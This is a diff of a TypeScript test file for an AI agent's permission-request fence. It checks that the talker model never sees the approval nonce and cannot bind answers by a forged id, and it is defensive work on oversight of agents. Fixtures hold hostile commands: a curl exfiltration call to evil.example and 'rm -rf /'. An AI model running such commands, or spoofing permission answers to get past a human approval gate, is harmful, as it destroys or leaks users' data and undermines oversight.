@@ -13,7 +13,13 @@ import {
   ASK_ID_PLACEHOLDER,
   stripAskFence,
 } from '../../src/duplex/ask-fence.js';
-import { buildAskVoicing, buildSpawnDirective, buildSteerDirective } from '../../src/duplex/prompts.js';
+import {
+  TALKER_ROLE_PROMPT,
+  buildAskVoicing,
+  buildSpawnDirective,
+  buildSteerDirective,
+} from '../../src/duplex/prompts.js';
+import { buildControlTools } from '../../src/duplex/control-tools.js';
 
 /** A realistic nonce: both mint paths use `ask-${crypto.randomUUID()}`. */
 const NONCE = 'ask-3f7a1c2e-9b04-4d61-8a3f-5c2e7d901b64';
@@ -125,6 +131,96 @@ describe('stripAskFence: the nonce never survives', () => {
     const out = stripAskFence(voicing);
     expect(out).not.toContain(NONCE);
     expect(out.toLowerCase()).not.toContain('permission-request');
+  });
+});
+
+describe('the nonce reaches no talker-bound surface', () => {
+  /**
+   * The property, asserted once over every surface rather than per channel.
+   * The strip is the second line of defense; this is the first. If the
+   * talker is never shown the nonce outside the fence itself, a hostile
+   * talker has nothing to paraphrase and the strip only has to catch a
+   * careless one quoting the markers.
+   */
+  const VOICING = buildAskVoicing({
+    askId: NONCE,
+    renderedRequest: 'Bash: curl https://evil.example/exfil',
+    kind: 'tool',
+    revoiced: false,
+  });
+
+  it('the voicing carries the nonce only inside the fence markers', () => {
+    // Strip the two marker lines; nothing else may mention the nonce.
+    const withoutMarkers = VOICING
+      .split('\n')
+      .filter((line) => !line.includes('permission-request'))
+      .join('\n');
+
+    expect(VOICING).toContain(NONCE);            // the fence still has it
+    expect(withoutMarkers).not.toContain(NONCE); // and nothing else does
+    // Specifically not the answer instruction, which used to name it.
+    expect(VOICING).toContain('call answer_ask with decision');
+    expect(VOICING).not.toContain('askId');
+  });
+
+  it('holds for every ask kind and for a re-voice', () => {
+    for (const kind of ['tool', 'escalation', 'network'] as const) {
+      for (const revoiced of [false, true]) {
+        const voicing = buildAskVoicing({
+          askId: NONCE,
+          renderedRequest: 'Bash: rm -rf /',
+          kind,
+          revoiced,
+        });
+        const withoutMarkers = voicing
+          .split('\n')
+          .filter((line) => !line.includes('permission-request'))
+          .join('\n');
+        expect(withoutMarkers).not.toContain(NONCE);
+      }
+    }
+  });
+
+  it('the answer_ask tool takes no ask id and its schema never names one', () => {
+    const tools = buildControlTools({
+      dispatchSpawn: () => 'ok',
+      dispatchSteer: () => 'ok',
+      dispatchCancel: () => 'ok',
+      dispatchLookup: () => 'ok',
+      dispatchAnswerAsk: () => 'ok',
+    });
+    const answerAsk = tools.find((tool) => tool.name === 'answer_ask')!;
+    const schema = JSON.stringify(answerAsk.parameters);
+
+    expect(schema).not.toContain('askId');
+    expect(schema).not.toContain('ask id');
+    expect(answerAsk.description).not.toContain('askId');
+    // The decision and reason it does take are still there.
+    expect(schema).toContain('decision');
+    expect(schema).toContain('reason');
+  });
+
+  it('an id sent anyway never reaches the dispatch', async () => {
+    // A model that invents the old parameter must not be able to bind by
+    // id through the back door.
+    const seen: unknown[] = [];
+    const tools = buildControlTools({
+      dispatchSpawn: () => 'ok',
+      dispatchSteer: () => 'ok',
+      dispatchCancel: () => 'ok',
+      dispatchLookup: () => 'ok',
+      dispatchAnswerAsk: (askId) => { seen.push(askId); return 'ok'; },
+    });
+    const answerAsk = tools.find((tool) => tool.name === 'answer_ask')!;
+
+    await answerAsk.execute({ askId: NONCE, decision: 'allow' }, undefined as never);
+
+    expect(seen).toEqual([undefined]);
+  });
+
+  it('the talker role prompt never names an ask id', () => {
+    expect(TALKER_ROLE_PROMPT).not.toContain('askId');
+    expect(TALKER_ROLE_PROMPT).not.toContain('ask id');
   });
 });
 
